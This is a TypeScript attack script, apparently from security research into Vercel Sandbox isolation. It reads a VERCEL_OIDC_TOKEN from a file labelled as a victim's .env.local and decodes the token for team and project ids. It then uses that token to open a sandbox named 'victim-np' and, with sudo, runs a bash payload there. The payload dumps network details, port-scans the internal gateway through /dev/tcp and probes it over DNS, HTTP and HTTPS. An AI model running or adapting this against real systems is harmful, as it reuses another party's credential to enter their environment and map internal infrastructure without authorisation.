import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== gw identity ==="
ip addr show eth0 2>/dev/null | head -8
cat /proc/net/arp
echo "=== ping gateway ==="
timeout 2 ping -c 1 -W 1 100.64.0.1 2>&1 | tail -2
echo "=== port scan gateway 100.64.0.1 (top services) ==="
for p in 22 53 67 80 443 3128 8080 1080 3000 3001 3002 5000 8000 8081 8888 9999 20000 23456 30001 30002 49152 50000 123 161 2375 2379 6443 9090 9100 22 23 25 110 445 5900; do
  timeout 1 bash -c "echo > /dev/tcp/100.64.0.1/$p" 2>/dev/null && echo "GW OPEN $p"
done
echo "gw scan done"
echo "=== gateway DNS test: nslookup via 100.64.0.1:53 ==="
timeout 4 nslookup example.com 100.64.0.1 2>&1 | head -8
echo "=== gateway DNS test: raw UDP to 100.64.0.1:53 ==="
timeout 4 python3 - <<'PYEOF'
import socket, struct, random, time
tid = random.randint(0,65535)
q = b"\\x07example\\x03com\\x00"
dns = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q + struct.pack("!HH", 1, 1)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(dns, ("100.64.0.1", 53))
try:
    data, addr = s.recvfrom(2048)
    print("GW DNS RESPONSE from %s: %d bytes" % (addr, len(data)))
    print("first 60:", data[:60])
except Exception as e:
    print("no gw dns response:", e)
PYEOF
echo "=== gateway HTTP test port 80 ==="
timeout 3 curl -sv --max-time 2 http://100.64.0.1/ 2>&1 | tail -5
echo "=== gateway HTTPS test port 443 ==="
timeout 3 curl -svk --max-time 2 https://100.64.0.1/ 2>&1 | tail -5
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore29.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore29.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
